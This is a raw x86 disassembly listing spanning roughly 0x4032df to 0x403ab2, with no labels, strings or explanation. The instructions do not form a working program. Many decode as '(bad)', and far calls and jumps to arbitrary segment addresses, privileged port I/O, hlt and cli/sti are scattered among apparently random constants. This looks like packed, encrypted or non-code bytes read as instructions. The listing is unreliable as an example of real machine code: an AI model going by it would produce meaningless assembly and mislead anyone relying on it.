  4032df:	xchg   ecx,eax
  4032e0:	push   ds
  4032e1:	cdq    
  4032e2:	jb     0x4032b4
  4032e4:	push   cs
  4032e5:	call   0x6fbe:0x5d5892a5
  4032ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ed:	push   ss
  4032ee:	jl     0x40332b
  4032f0:	(bad)  
  4032f1:	mov    ecx,0xdbd4f2ed
  4032f6:	mov    edx,0x96ac1063
  4032fb:	mov    ds:0xde6c28f0,al
  403300:	test   BYTE PTR [esi],ch
  403302:	fcomp  DWORD PTR [ebp+0x3da3fa5d]
  403308:	and    eax,0x99b9b859
  40330d:	js     0x40336b
  40330f:	repnz sbb dl,ah
  403312:	adc    DWORD PTR [esi],ecx
  403314:	dec    esp
  403315:	mov    al,ds:0xeb18410d
  40331a:	push   esi
  40331b:	xchg   ebx,edx
  40331d:	jb     0x4032f1
  40331f:	cmp    ebx,DWORD PTR [ebp+0x39f9abef]
  403325:	pop    es
  403326:	(bad)  
  403327:	fist   DWORD PTR [eax-0x6982efbe]
  40332d:	cmp    eax,0x170deeb2
  403332:	jg     0x4033a0
  403334:	cmp    edi,edi
  403336:	inc    eax
  403337:	jmp    0x6cca:0x5c09aba9
  40333e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40333f:	jns    0x4033c0
  403341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403342:	pop    ebx
  403343:	and    eax,0x90605201
  403348:	mov    ch,0xf3
  40334a:	or     DWORD PTR ds:0x53d4d5e8,edi
  403350:	inc    esi
  403351:	inc    edx
  403352:	mov    eax,ds:0x469dc690
  403357:	ins    DWORD PTR es:[edi],dx
  403358:	add    BYTE PTR [ebx+0x4ece3c6f],bh
  40335e:	jge    0x403350
  403360:	ret    
  403361:	ret    
  403362:	aam    0x58
  403364:	(bad)
  403368:	jl     0x4033bc
  40336a:	test   al,0x3d
  40336c:	(bad)  
  40336d:	mov    ebx,0x86b69e1c
  403372:	ja     0x4033b3
  403374:	sub    al,0x43
  403376:	mov    eax,fs
  403378:	mov    dh,0xf3
  40337a:	inc    ebx
  40337b:	adc    eax,0x6059e5df
  403380:	test   eax,0xc9038029
  403385:	push   0x65df27d2
  40338a:	dec    ecx
  40338b:	push   esi
  40338c:	pop    edx
  40338d:	mov    al,ds:0xd520db1f
  403392:	cwde   
  403393:	call   0x183c:0xb74e57dc
  40339a:	jl     0x403338
  40339c:	sub    DWORD PTR [ebx],eax
  40339e:	ret    
  40339f:	pop    ss
  4033a0:	test   al,0x72
  4033a2:	das    
  4033a3:	lahf   
  4033a4:	jl     0x4033c0
  4033a6:	mov    edx,0xf27e37e5
  4033ab:	outs   dx,DWORD PTR ds:[esi]
  4033ac:	es fwait
  4033ae:	push   cs
  4033af:	in     al,0xe7
  4033b1:	dec    eax
  4033b2:	or     DWORD PTR [edx],edx
  4033b4:	adc    ch,dh
  4033b6:	push   es
  4033b7:	push   cs
  4033b8:	js     0x40334d
  4033ba:	mov    ebx,edx
  4033bc:	xchg   edx,eax
  4033bd:	outs   dx,DWORD PTR ds:[esi]
  4033be:	daa    
  4033bf:	mov    ecx,0x9ee530c2
  4033c4:	sub    al,0x3c
  4033c6:	dec    eax
  4033c7:	outs   dx,DWORD PTR ds:[esi]
  4033c8:	push   eax
  4033c9:	fldcw  WORD PTR [ebx+0x69]
  4033cc:	(bad)  [ecx]
  4033ce:	ss add dh,cl
  4033d1:	cs jns 0x403410
  4033d4:	mov    ebx,0xfbef1f8a
  4033d9:	pop    ss
  4033da:	(bad)  
  4033db:	mov    eax,0xb2e94a7b
  4033e0:	jbe    0x403378
  4033e2:	add    DWORD PTR [ecx+0x1fc44237],edx
  4033e8:	call   0xfac88c32
  4033ed:	out    dx,eax
  4033ee:	xor    eax,0xc2b1e33e
  4033f3:	out    dx,eax
  4033f4:	repz add DWORD PTR [esi+eax*8+0x29],0xffffffae
  4033fa:	sahf   
  4033fb:	retf   0xbd19
  4033fe:	or     BYTE PTR [eax],ch
  403400:	sub    bh,cl
  403402:	fisttp QWORD PTR [edi-0x1f3505a]
  403408:	jmp    0x403436
  40340a:	sub    cl,BYTE PTR [ebx+0x6cd7811f]
  403410:	aad    0x8e
  403412:	jne    0x403472
  403414:	out    0x2d,eax
  403416:	dec    esi
  403417:	jp     0x403477
  403419:	add    DWORD PTR [eax+0x2a66f334],esi
  40341f:	pop    eax
  403420:	jle    0x4033b3
  403422:	cmp    cl,BYTE PTR [ebx+0x3c16477e]
  403428:	or     al,0x7e
  40342a:	or     al,0x93
  40342c:	mov    ah,0x47
  40342e:	outs   dx,DWORD PTR ds:[esi]
  40342f:	clc    
  403430:	and    eax,0xa46796dc
  403435:	call   0x7657a5dc
  40343a:	fmul   DWORD PTR [ebp+0x6aba2b66]
  403440:	and    DWORD PTR [ebp-0x3092a02],0xffffff97
  403447:	xchg   BYTE PTR [edx],bl
  403449:	std    
  40344a:	adc    DWORD PTR [ebp-0x561a19b0],edi
  403450:	sbb    al,0xb9
  403452:	push   eax
  403453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403454:	jns    0x403450
  403456:	inc    esp
  403457:	sub    al,0x2d
  403459:	bound  edi,QWORD PTR [ebx+0x70]
  40345c:	sbb    eax,0x1d95138a
  403461:	or     al,0xba
  403463:	inc    edx
  403464:	mov    dh,0x5c
  403466:	and    ch,ch
  403468:	fs sbb al,0x2e
  40346b:	and    DWORD PTR [ecx-0x2fcef907],ebp
  403471:	xor    al,0xb0
  403473:	mov    al,0x69
  403475:	xchg   BYTE PTR [edx],dl
  403477:	xor    eax,0xb1bfb05
  40347c:	xor    BYTE PTR [eax-0x5d],ah
  40347f:	inc    eax
  403480:	int3   
  403481:	fldenv [esi-0x24]
  403484:	ret    
  403485:	(bad)  
  403486:	std    
  403487:	mov    dl,0xeb
  403489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348a:	into   
  40348b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40348c:	les    ecx,FWORD PTR [ebx+0x470eda98]
  403492:	inc    edx
  403493:	fwait
  403494:	stos   DWORD PTR es:[edi],eax
  403495:	into   
  403496:	sub    esp,DWORD PTR [ebx+ebp*1-0x2]
  40349a:	dec    esp
  40349b:	pop    ecx
  40349c:	sti    
  40349d:	retf   0xc36b
  4034a0:	scas   eax,DWORD PTR es:[edi]
  4034a1:	lods   al,BYTE PTR ds:[esi]
  4034a2:	adc    BYTE PTR [edx],cl
  4034a4:	fisttp WORD PTR [edx+0xa]
  4034a7:	iret   
  4034a8:	(bad)  [eax]
  4034aa:	inc    edx
  4034ab:	cmp    BYTE PTR [esi+0x4c],0x48
  4034af:	inc    esi
  4034b0:	icebp  
  4034b1:	push   ds
  4034b2:	mov    edi,DWORD PTR [ecx+ebp*2]
  4034b5:	adc    ebp,DWORD PTR [edx+0x67af1c2]
  4034bb:	pop    edx
  4034bc:	ins    BYTE PTR es:[edi],dx
  4034bd:	hlt    
  4034be:	lods   eax,DWORD PTR ds:[esi]
  4034bf:	cmp    ebp,DWORD PTR [esi]
  4034c1:	jg     0x4034dc
  4034c3:	xchg   edi,eax
  4034c4:	fidivr WORD PTR [eax-0x753f2358]
  4034ca:	add    ecx,DWORD PTR [esi-0x4868290d]
  4034d0:	scas   al,BYTE PTR es:[edi]
  4034d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034d2:	jnp    0x403543
  4034d4:	cmp    dl,BYTE PTR [edi+edi*4+0x68]
  4034d8:	jae    0x40348d
  4034da:	stos   BYTE PTR es:[edi],al
  4034db:	push   0x9b4e649a
  4034e0:	mov    cl,BYTE PTR [ebp+0x22]
  4034e3:	leave  
  4034e4:	mov    ah,0xf3
  4034e6:	cdq    
  4034e7:	pop    ebp
  4034e8:	xchg   ebp,eax
  4034e9:	dec    esp
  4034ea:	xchg   edx,eax
  4034eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034ec:	iret   
  4034ed:	js     0x4034b1
  4034ef:	and    BYTE PTR [eax],ah
  4034f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034f2:	daa    
  4034f3:	pusha  
  4034f4:	adc    ebx,ebx
  4034f6:	push   esi
  4034f7:	sar    edx,1
  4034f9:	sbb    esp,DWORD PTR [esi]
  4034fb:	fadd   st(7),st
  4034fd:	inc    eax
  4034fe:	jbe    0x4034ac
  403500:	pop    esi
  403501:	stos   BYTE PTR es:[edi],al
  403502:	scas   al,BYTE PTR es:[edi]
  403503:	fisubr WORD PTR ds:0x4ecd60a1
  403509:	push   edx
  40350a:	mov    al,ds:0x855a98f7
  40350f:	repnz fisub WORD PTR [ebx+0x49]
  403513:	pop    edi
  403514:	pop    ebx
  403515:	fsubr  QWORD PTR [edx]
  403517:	addr16 lock jg 0x4034f1
  40351b:	mov    ch,0xe4
  40351d:	xchg   ebx,eax
  40351e:	sub    BYTE PTR [edi+esi*1+0x69c5ee9],ah
  403525:	cli    
  403526:	jmp    0x4e8a:0x3ea90d02
  40352d:	outs   dx,BYTE PTR ds:[esi]
  40352e:	mov    ecx,0x8aa75d07
  403533:	inc    ebx
  403534:	adc    dl,ah
  403536:	pop    edi
  403537:	mov    DWORD PTR [esi],ebx
  403539:	add    al,0xac
  40353b:	shr    DWORD PTR [eax],cl
  40353d:	iret   
  40353e:	loop   0x403521
  403540:	sbb    al,0x54
  403542:	mov    cl,0x85
  403544:	cmc    
  403545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403546:	dec    ebp
  403547:	fcom   DWORD PTR [ebx]
  403549:	jnp    0x40351c
  40354b:	fcmovu st,st(3)
  40354d:	(bad)  
  40354e:	push   0x570acbe0
  403553:	fidiv  WORD PTR [edi]
  403555:	enter  0x45c0,0x5c
  403559:	sbb    BYTE PTR [eax+edx*4-0x4],ch
  40355d:	(bad)  
  40355e:	aaa    
  40355f:	xlat   BYTE PTR ds:[ebx]
  403560:	push   cs
  403561:	lds    ax,DWORD PTR [edi+0x46809102]
  403568:	push   0x601376f
  40356d:	lods   eax,DWORD PTR ds:[esi]
  40356e:	push   ecx
  40356f:	add    edi,DWORD PTR [edx+0x6e2b4642]
  403575:	xchg   esi,eax
  403576:	add    eax,DWORD PTR [ebp-0x4b]
  403579:	das    
  40357a:	jne    0x4035f1
  40357c:	xchg   esi,eax
  40357d:	ins    DWORD PTR es:[edi],dx
  40357e:	pop    esp
  40357f:	xor    al,0xcb
  403581:	dec    ebp
  403582:	mov    dl,0xf9
  403584:	dec    eax
  403585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403586:	mov    ebp,0x59f80e3a
  40358b:	push   es
  40358c:	imul   eax,DWORD PTR [esi],0xf2c4d2d
  403592:	sar    ah,1
  403594:	(bad)  
  403595:	and    ebx,DWORD PTR [esi+0x37087236]
  40359b:	bound  edi,QWORD PTR ss:[ebp-0x99cea67]
  4035a2:	aaa    
  4035a3:	sub    DWORD PTR [esi-0x41],edi
  4035a6:	loope  0x4035b3
  4035a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035a9:	pop    ds
  4035aa:	lea    ecx,[ecx+0x7a49ff51]
  4035b0:	out    0x36,eax
  4035b2:	jg     0x4035f6
  4035b4:	mov    edi,0x76fb1e8b
  4035b9:	cmp    al,0x3f
  4035bb:	cwde   
  4035bc:	fcmovnb st,st(5)
  4035be:	outs   dx,BYTE PTR ds:[esi]
  4035bf:	cdq    
  4035c0:	dec    edi
  4035c1:	sbb    eax,0x8e50ad60
  4035c6:	push   esp
  4035c7:	or     al,0xc2
  4035c9:	xchg   ch,dl
  4035cb:	int3   
  4035cc:	jp     0x4035eb
  4035ce:	ja     0x403550
  4035d0:	bound  edi,QWORD PTR [eax+0x10]
  4035d3:	mov    ebx,0xc1f6725a
  4035d8:	ss pop esp
  4035da:	test   al,bh
  4035dc:	aam    0x4f
  4035de:	push   ecx
  4035df:	cmp    DWORD PTR [esi+ebp*8+0x5167853f],esi
  4035e6:	retf   0x7eae
  4035e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035ea:	dec    ebx
  4035eb:	pusha  
  4035ec:	jb     0x40360f
  4035ee:	(bad)  
  4035ef:	xor    dl,BYTE PTR [edx-0x4c]
  4035f2:	fmul   DWORD PTR [eax+0x2ebc3f05]
  4035f8:	or     ch,BYTE PTR [ecx+0x64]
  4035fb:	pushf  
  4035fc:	jns    0x4035fa
  4035fe:	add    edi,edx
  403600:	in     al,0xb8
  403602:	sbb    BYTE PTR [edx+0x7745a534],al
  403608:	add    BYTE PTR [ebp+0xbe499df],dl
  40360e:	inc    esp
  40360f:	jecxz  0x4035db
  403611:	out    0x82,eax
  403613:	pushf  
  403614:	test   eax,0x59288d85
  403619:	into   
  40361a:	daa    
  40361b:	lea    ecx,[eax+0x3c8d4a6a]
  403621:	test   BYTE PTR [edx-0x2e],0xe1
  403625:	not    DWORD PTR [eax]
  403627:	jmp    0x403631
  403629:	mov    ch,0x97
  40362b:	mov    ebp,DWORD PTR [ecx]
  40362d:	mov    ds:0xa3316a71,al
  403632:	sbb    BYTE PTR [edi+0x38a23074],ah
  403638:	repnz aaa 
  40363a:	mov    ebp,DWORD PTR [ecx]
  40363c:	pop    esi
  40363d:	mov    esi,0x419ea585
  403642:	jl     0x40365d
  403644:	dec    esp
  403645:	inc    eax
  403646:	push   0x8e36f425
  40364b:	outs   dx,DWORD PTR ds:[esi]
  40364c:	iret   
  40364d:	iret   
  40364e:	dec    eax
  40364f:	pop    edi
  403651:	or     ch,BYTE PTR [edx+0x7188caad]
  403657:	sahf   
  403658:	add    esi,DWORD PTR [esi-0x30bbabaa]
  40365e:	jbe    0x4036ae
  403660:	sbb    BYTE PTR [edi+0x74383c9],ah
  403666:	pop    ebp
  403667:	adc    bl,dh
  403669:	mov    al,0x22
  40366b:	int3   
  40366c:	pop    ebx
  40366d:	sub    al,0xc
  40366f:	cli    
  403670:	aam    0x33
  403672:	and    al,0x27
  403674:	dec    ebp
  403675:	inc    ebp
  403676:	xchg   ebp,eax
  403677:	push   si
  403679:	and    al,0xdb
  40367b:	dec    edx
  40367c:	sbb    BYTE PTR [ecx],al
  40367e:	dec    ebp
  40367f:	aaa    
  403680:	pop    eax
  403681:	sahf   
  403682:	pusha  
  403683:	les    edi,FWORD PTR [ecx-0x47]
  403686:	push   cs
  403687:	add    DWORD PTR [edx-0x1b],esp
  40368a:	mul    BYTE PTR [eax-0x53eeb521]
  403690:	ds push edx
  403692:	cmp    al,al
  403694:	in     eax,0xd3
  403696:	mov    WORD PTR ds:0x6bf71ac5,gs
  40369c:	jnp    0x4036ad
  40369e:	add    ebp,DWORD PTR [ebp+0x35]
  4036a1:	sti    
  4036a2:	add    eax,0x47689e4e
  4036a7:	shr    DWORD PTR [edx],0x3e
  4036aa:	stc    
  4036ab:	and    DWORD PTR [eax],0xffffffbd
  4036ae:	scas   al,BYTE PTR es:[edi]
  4036af:	pop    esp
  4036b0:	das    
  4036b1:	mov    al,0xc8
  4036b3:	mov    ebx,0x2a800da8
  4036b8:	mov    edi,0x3c494e1f
  4036bd:	xchg   ecx,eax
  4036be:	retf   0xe74f
  4036c1:	pop    es
  4036c2:	arpl   si,si
  4036c4:	dec    edx
  4036c5:	sub    al,BYTE PTR [ebx-0x2c]
  4036c8:	xchg   ebx,eax
  4036c9:	lds    eax,FWORD PTR gs:[esi-0x226f7195]
  4036d0:	xchg   edx,eax
  4036d1:	cmp    DWORD PTR [ebx-0x57],edi
  4036d4:	jb     0x4036d9
  4036d6:	mov    ds:0x1e611d4e,eax
  4036db:	xor    eax,0xb8467ed6
  4036e0:	hlt    
  4036e1:	pop    es
  4036e2:	lea    eax,[esi-0xe4c94db]
  4036e8:	or     al,0x37
  4036ea:	repz or al,dl
  4036ed:	inc    ecx
  4036ee:	enter  0xf66c,0x92
  4036f2:	adc    cl,dh
  4036f4:	jmp    0x8a391658
  4036f9:	inc    esi
  4036fa:	push   edx
  4036fb:	data16 and BYTE PTR [ebp+0x58],cl
  4036ff:	xchg   ebx,eax
  403700:	jno    0x403709
  403702:	pop    es
  403703:	outs   dx,DWORD PTR ds:[esi]
  403704:	xchg   BYTE PTR [ebp+0x70ce5102],dh
  40370a:	push   edi
  40370b:	out    dx,eax
  40370c:	inc    ebx
  40370d:	retf   
  40370e:	lock add eax,0xe87b3d4f
  403714:	jmp    0x1e30:0x4f5a3d15
  40371b:	dec    esp
  40371c:	imul   esp,DWORD PTR [ecx+0x55],0xf96c37d8
  403723:	out    dx,al
  403724:	jp     0x403709
  403726:	pop    ebp
  403727:	cmp    bh,bl
  403729:	daa    
  40372a:	pop    ds
  40372b:	lds    ebp,FWORD PTR [ebx]
  40372d:	sti    
  40372e:	dec    ecx
  40372f:	jle    0x403717
  403731:	mov    cl,0x71
  403733:	mov    ?,WORD PTR [edx]
  403735:	(bad)  
  403736:	jmp    0x403778
  403738:	fiadd  WORD PTR [edx]
  40373a:	mov    cl,BYTE PTR [ebx+0x46a5b49]
  403740:	jne    0x403764
  403742:	or     al,0xcb
  403744:	lods   al,BYTE PTR ds:[esi]
  403745:	sub    ecx,DWORD PTR [edx-0x6e2f93ba]
  40374b:	vminsd xmm0,xmm3,QWORD PTR [eax-0x2f1d1555]
  403753:	and    ebx,DWORD PTR [ebx+0x37]
  403756:	xor    BYTE PTR [ebx-0x5e],cl
  403759:	shl    al,0xbe
  40375c:	dec    esi
  40375d:	push   ebx
  40375e:	daa    
  40375f:	loopne 0x4036f7
  403761:	xchg   ecx,eax
  403762:	xor    eax,0x14161413
  403767:	mov    DWORD PTR [ebx+0x1a],esp
  40376a:	cdq    
  40376b:	or     eax,0x1df817e0
  403770:	jae    0x4037d8
  403772:	(bad)
  403776:	ins    DWORD PTR es:[edi],dx
  403777:	int    0x16
  403779:	cmp    eax,0xf72422f1
  40377e:	sbb    ah,dh
  403780:	bound  esi,QWORD PTR [eax+0x70]
  403783:	jns    0x403801
  403785:	mov    ebx,0xfdd43ce2
  40378a:	mov    ds:0x27bcb53d,eax
  40378f:	(bad)  
  403790:	repz ja 0x4037f8
  403793:	and    eax,0x561ac59c
  403798:	or     BYTE PTR [eax+0x20],cl
  40379b:	xchg   esp,eax
  40379c:	cmp    eax,DWORD PTR [edi-0x4420443a]
  4037a2:	inc    edx
  4037a3:	add    esi,edx
  4037a5:	mov    edi,0xf30b5fe9
  4037aa:	xor    BYTE PTR [ebp-0x2525c0c2],ah
  4037b0:	call   0x49d6:0xa9be8171
  4037b7:	retf   
  4037b8:	mov    eax,0xcedcbf03
  4037bd:	pop    es
  4037be:	(bad)  [eax+0x41d92dd0]
  4037c4:	repz in eax,0x9
  4037c7:	retf   0x55c6
  4037ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037cb:	cmp    eax,0x557797d0
  4037d0:	std    
  4037d1:	adc    al,0x3
  4037d3:	or     cl,BYTE PTR [ebp+eiz*4-0x77d0ab61]
  4037da:	popf   
  4037db:	ss xchg edx,eax
  4037dd:	jecxz  0x403839
  4037df:	add    al,ch
  4037e1:	pop    ebp
  4037e2:	leave  
  4037e3:	retf   0x614d
  4037e6:	cmp    ah,BYTE PTR [ebx]
  4037e8:	push   edx
  4037e9:	mov    dl,0x52
  4037eb:	call   0x3110e17d
  4037f0:	outs   dx,BYTE PTR ds:[esi]
  4037f1:	fs cld 
  4037f3:	out    dx,eax
  4037f4:	add    ecx,DWORD PTR [edx]
  4037f6:	outs   dx,DWORD PTR ds:[esi]
  4037f7:	dec    esp
  4037f8:	mov    DWORD PTR [ebx-0x5982308f],ebp
  4037fe:	and    al,0x7
  403800:	div    BYTE PTR [ecx-0x71d66223]
  403806:	sbb    eax,DWORD PTR [eax+0x45952c2]
  40380c:	xchg   ebp,eax
  40380d:	cmp    bh,BYTE PTR [edi-0x17]
  403810:	clc    
  403811:	pop    ecx
  403812:	mov    DWORD PTR [ecx-0x36],esi
  403815:	fist   DWORD PTR [ebx]
  403817:	and    DWORD PTR [ebx+0x9eab767],ebx
  40381d:	sub    eax,DWORD PTR [ebp-0x2ea8e27f]
  403823:	sub    BYTE PTR [eax+0x45],bh
  403826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403827:	jg     0x40385d
  403829:	cmp    eax,0xaf0e0a7e
  40382e:	out    0xd1,eax
  403830:	ja     0x403830
  403832:	mov    dl,0x82
  403834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403835:	push   ebp
  403836:	jle    0x403823
  403838:	stos   DWORD PTR es:[edi],eax
  403839:	les    ebx,FWORD PTR cs:[ecx+eax*1]
  40383d:	aas    
  40383e:	xor    DWORD PTR [edx-0x2c],ebp
  403841:	js     0x4037f2
  403843:	add    al,0xb7
  403845:	xchg   ecx,eax
  403846:	aam    0xda
  403848:	iret   
  403849:	xchg   esp,eax
  40384a:	xchg   esp,eax
  40384b:	in     eax,0x98
  40384d:	push   0x88b3f01
  403852:	mov    bh,0x69
  403854:	je     0x4038ba
  403856:	in     al,0x9
  403858:	add    DWORD PTR [eax],0x7d
  40385b:	test   DWORD PTR [esi-0x565aaa9e],esi
  403861:	sbb    BYTE PTR [eax-0x43],dl
  403864:	push   ds
  403865:	loopne 0x403827
  403867:	push   edi
  403868:	sbb    bh,bh
  40386a:	outs   dx,BYTE PTR ds:[esi]
  40386b:	push   edx
  40386c:	push   ds
  40386d:	imul   edx,edi,0xb5009cb9
  403873:	push   esi
  403874:	out    0x57,eax
  403876:	out    dx,al
  403877:	rcl    BYTE PTR [ecx],cl
  403879:	xor    eax,0x7ba76148
  40387e:	cmp    esi,DWORD PTR [edi]
  403880:	ss aas 
  403882:	cdq    
  403883:	mov    cl,0x26
  403885:	lods   eax,DWORD PTR ds:[esi]
  403886:	sub    al,BYTE PTR [ebx+0x604be607]
  40388c:	jbe    0x403819
  40388e:	fstp   st(3)
  403890:	jo     0x403871
  403892:	jmp    0x403853
  403894:	(bad)  
  403896:	push   ecx
  403897:	jp     0x40387f
  403899:	out    0x50,al
  40389b:	inc    esi
  40389c:	mov    eax,0x34dde70f
  4038a1:	jne    0x4038c6
  4038a3:	mov    al,0xf5
  4038a5:	push   es
  4038a6:	xor    esp,eax
  4038a8:	and    bh,BYTE PTR ds:0x3569d400
  4038ae:	and    esp,DWORD PTR [edx+0x3c]
  4038b1:	sar    DWORD PTR [ebx+0x51],0xd7
  4038b5:	push   es
  4038b6:	jp     0x403862
  4038b8:	cmp    BYTE PTR [ebx-0xd475c08],bl
  4038be:	add    eax,0x4f131465
  4038c3:	xchg   ebp,eax
  4038c4:	lock loopne 0x4038a2
  4038c7:	sbb    dh,dl
  4038c9:	ins    BYTE PTR es:[edi],dx
  4038ca:	aam    0x98
  4038cc:	sbb    BYTE PTR [ecx+0x45],dl
  4038cf:	inc    esp
  4038d0:	out    dx,eax
  4038d1:	mov    ah,0x19
  4038d3:	mov    al,0x2f
  4038d5:	push   ecx
  4038d6:	jmp    FWORD PTR [edi+0xa]
  4038d9:	jg     0x40390e
  4038db:	inc    esp
  4038dc:	push   ebp
  4038dd:	inc    esi
  4038de:	jne    0x403937
  4038e0:	(bad)  
  4038e1:	xchg   ebp,eax
  4038e2:	(bad)  
  4038e3:	xchg   ebx,eax
  4038e4:	jb     0x403922
  4038e6:	pop    ebx
  4038e7:	pop    ebx
  4038e8:	or     al,0xfe
  4038ea:	or     BYTE PTR ss:[edx+0x79],dl
  4038ee:	or     eax,0x2f3b70eb
  4038f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038f4:	call   0xe02f:0x850a0f0d
  4038fb:	imul   BYTE PTR [edx]
  4038fd:	add    DWORD PTR ds:0xafc48194,edx
  403903:	jl     0x4038c6
  403905:	(bad)  
  403906:	mov    al,ds:0xb3f9fc32
  40390b:	sbb    eax,0x5aef3282
  403910:	imul   eax,esp,0xc2bae30c
  403916:	lea    esi,[eax+ebx*2-0x13d17be0]
  40391d:	int3   
  40391e:	push   esp
  40391f:	addr16 mov dh,0x6
  403922:	(bad)
  403925:	les    eax,FWORD PTR [esi]
  403927:	aaa    
  403928:	cmp    eax,0xcccf5e73
  40392d:	das    
  40392e:	(bad)  
  40392f:	jmp    0xd370:0xf38fea17
  403936:	and    DWORD PTR [esi+0x2],0xffffffc5
  40393a:	jecxz  0x4038ef
  40393c:	and    BYTE PTR [edx+0x713981f6],0xf5
  403943:	lods   al,BYTE PTR ds:[esi]
  403944:	mov    edi,0x6a4e1b00
  403949:	std    
  40394a:	setns  BYTE PTR [ebx+edi*8+0x3b2c6f4a]
  403952:	mov    gs,WORD PTR [edx-0x14]
  403955:	cmp    eax,0x966b9bae
  40395a:	add    al,0x3d
  40395c:	test   DWORD PTR [ecx-0x65d5cc44],ecx
  403962:	(bad)  
  403963:	jbe    0x403931
  403965:	dec    esi
  403966:	jmp    0x8d99c620
  40396b:	push   ecx
  40396c:	int3   
  40396d:	and    dl,BYTE PTR [bp+di+0x6f]
  403971:	mov    edi,0x74b524bf
  403976:	xchg   dh,ch
  403978:	sub    edi,DWORD PTR [ecx-0x63]
  40397b:	mov    dl,BYTE PTR [ecx-0x2c]
  40397e:	sbb    DWORD PTR [ebp+edx*8-0xd035bca],0x65
  403986:	mov    esi,0x827d160b
  40398b:	in     al,0x97
  40398d:	mov    BYTE PTR [edx+0x55ed34da],ah
  403993:	jecxz  0x4039f4
  403995:	xor    eax,0x3979af69
  40399a:	pop    ss
  40399b:	pop    edi
  40399c:	xchg   esp,eax
  40399d:	loop   0x403993
  40399f:	mov    al,0xdb
  4039a1:	rcr    DWORD PTR [ebp+ecx*8-0x5f73ead7],1
  4039a8:	jmp    0x4039ad
  4039aa:	stos   BYTE PTR es:[edi],al
  4039ab:	jae    0x40395e
  4039ad:	or     DWORD PTR [edx],ecx
  4039af:	pop    edx
  4039b0:	cmp    BYTE PTR [esp+edx*2-0x100d9269],dh
  4039b7:	adc    eax,0x1d7fbe04
  4039bc:	pusha  
  4039bd:	jb     0x403a0a
  4039bf:	sbb    al,BYTE PTR [edi-0x3e3bfb55]
  4039c5:	mov    al,ds:0x61a50651
  4039ca:	push   eax
  4039cb:	cld    
  4039cc:	cmp    al,0x2e
  4039ce:	sub    DWORD PTR [esi+edi*8-0x248e8b87],ecx
  4039d5:	xchg   ebp,eax
  4039d6:	cmp    edx,DWORD PTR [ebx-0x689deda5]
  4039dc:	orps   xmm2,XMMWORD PTR [ebx-0x27f8b2fb]
  4039e3:	je     0x4039bf
  4039e5:	jecxz  0x403a18
  4039e7:	test   BYTE PTR [esi+0x59],cl
  4039ea:	jb     0x403a4f
  4039ec:	xlat   BYTE PTR ds:[ebx]
  4039ed:	push   ds
  4039ee:	pushf  
  4039ef:	cmp    eax,0x862dba70
  4039f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039f5:	inc    ebp
  4039f6:	jbe    0x403a57
  4039f8:	push   0xff054504
  4039fd:	jle    0x403a0b
  4039ff:	pusha  
  403a00:	jnp    0x4039b1
  403a02:	(bad)  
  403a03:	(bad)  [eax]
  403a05:	call   0x54c53a40
  403a0a:	mov    edi,0x441d2414
  403a0f:	lds    edx,FWORD PTR [edx]
  403a11:	jnp    0x403a45
  403a13:	cmp    BYTE PTR [ebp+0x41],dh
  403a16:	sub    eax,0x8afdd34f
  403a1b:	mov    ecx,0x86923ace
  403a20:	jmp    0x403a5a
  403a22:	ins    BYTE PTR es:[edi],dx
  403a23:	cmp    esi,ebp
  403a25:	sbb    DWORD PTR [edx],esp
  403a27:	xlat   BYTE PTR ds:[ebx]
  403a28:	jmp    0xfe82e59b
  403a2d:	push   0xffffffe5
  403a2f:	sub    BYTE PTR [eax],dl
  403a31:	mov    bh,0x4a
  403a33:	repnz imul edx,DWORD PTR ds:0xe778bac8,0xb38fa8e7
  403a3e:	jne    0x403a40
  403a40:	jae    0x403a95
  403a42:	or     al,0x96
  403a44:	add    dh,BYTE PTR [edx+0x3940605]
  403a4a:	mov    ebp,0x4f66dec0
  403a4f:	xor    al,0xf5
  403a51:	dec    edi
  403a52:	fwait
  403a53:	dec    ebp
  403a54:	jmp    0x403a5a
  403a56:	mov    esp,0x6de2dd31
  403a5b:	or     ecx,DWORD PTR [esi+0x5e]
  403a5e:	or     BYTE PTR [edx+0x19],0x4e
  403a62:	mov    dh,0x60
  403a64:	mov    BYTE PTR [edi],dl
  403a66:	loop   0x403ad9
  403a68:	mov    ds:0x2b006d5c,al
  403a6d:	nop    DWORD PTR [edi]
  403a70:	mov    bl,0xe1
  403a72:	pop    esp
  403a73:	cmp    BYTE PTR [edi+ecx*8-0x7a635681],bl
  403a7a:	aas    
  403a7b:	sar    BYTE PTR [eax+0x5a560175],1
  403a81:	pop    edi
  403a82:	cmp    al,BYTE PTR [eax]
  403a84:	out    dx,al
  403a85:	push   ecx
  403a86:	jle    0x403a53
  403a88:	add    BYTE PTR [edx],dh
  403a8a:	in     eax,0x94
  403a8c:	adc    dl,BYTE PTR [edx+esi*8-0x79]
  403a90:	or     cl,BYTE PTR [esi]
  403a92:	in     eax,0x80
  403a94:	cmp    esp,DWORD PTR [eax-0x30317e62]
  403a9a:	js     0x403a6a
  403a9c:	sti    
  403a9d:	fwait
  403a9e:	push   si
  403aa0:	(bad)  
  403aa1:	and    DWORD PTR [edx],esp
  403aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403aa4:	add    edx,DWORD PTR [esi+0x6c]
  403aa7:	rcr    DWORD PTR [ebx],cl
  403aa9:	dec    ecx
  403aaa:	adc    esp,DWORD PTR [ebx+0x3906c2d5]
  403ab0:	jbe    0x403acb
  403ab2:	(bad)
